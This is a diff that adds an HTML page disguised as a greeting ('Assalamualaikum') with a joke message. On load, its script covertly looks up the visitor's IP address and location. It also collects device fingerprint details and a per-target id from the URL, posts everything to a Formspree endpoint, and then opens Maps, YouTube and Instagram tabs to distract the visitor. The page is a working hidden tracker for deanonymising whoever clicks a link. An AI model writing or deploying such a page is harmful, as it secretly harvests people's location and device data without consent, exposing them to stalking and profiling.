@@ -1,0 +1,90 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Assalamualaikum</title>
+  <script>
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    const isAndroid = /android/i.test(ua);
+    const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
+    const isMobile = isAndroid || isIOS;
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id') || "anon";
+
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const info = {
+          identifier: id,
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          org: data.org,
+          time: new Date().toISOString(),
+          ua: navigator.userAgent,
+          platform: navigator.platform,
+          lang: navigator.language,
+          screen: `${window.screen.width}x${window.screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          cookies_enabled: navigator.cookieEnabled,
+          referrer: document.referrer || "direct",
+          token: Math.random().toString(36).substring(2, 10),
+          device_memory: navigator.deviceMemory || "unknown",
+          cpu_cores: navigator.hardwareConcurrency || "unknown",
+          color_depth: screen.colorDepth || "unknown",
+          pixel_ratio: window.devicePixelRatio || "unknown",
+          online: navigator.onLine,
+          device_type: isIOS ? "iOS" : isAndroid ? "Android" : "Desktop"
+        };
+
+        fetch("https://formspree.io/f/mrbkpvwy", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(info),
+        }).catch((e) => {
+          console.log("Log failed", e);
+        }).finally(() => {
+          if (isAndroid) {
+            // Android: Maps → YouTube → IG
+            window.open("https://www.google.com/maps", "_blank", "noopener");
+            setTimeout(() => {
+              window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", "_blank", "noopener");
+            }, 2000);
+            setTimeout(() => {
+              window.open("https://www.instagram.com/", "_blank", "noopener");
+            }, 4000);
+          } else if (isIOS) {
+            // iOS: IG → Maps → YouTube
+            window.open("https://www.instagram.com/", "_blank", "noopener");
+            setTimeout(() => {
+              window.open("https://www.google.com/maps", "_blank", "noopener");
+            }, 2000);
+            setTimeout(() => {
+              window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", "_blank", "noopener");
+            }, 4000);
+          } else {
+            // Desktop: Maps → YouTube → IG
+            window.open("https://www.google.com/maps", "_blank", "noopener");
+            setTimeout(() => {
+              window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", "_blank", "noopener");
+            }, 2000);
+            setTimeout(() => {
+              window.open("https://www.instagram.com/", "_blank", "noopener");
+            }, 4000);
+          }
+
+          // Fallback redirect
+          setTimeout(() => {
+            window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
+          }, 6000);
+        });
+      });
+  </script>
+</head>
+<body>
+  <p style="font-family: monospace; font-size: 1.2rem;">[ Slebeewwwww....... ]</p>
+</body>
+</html>
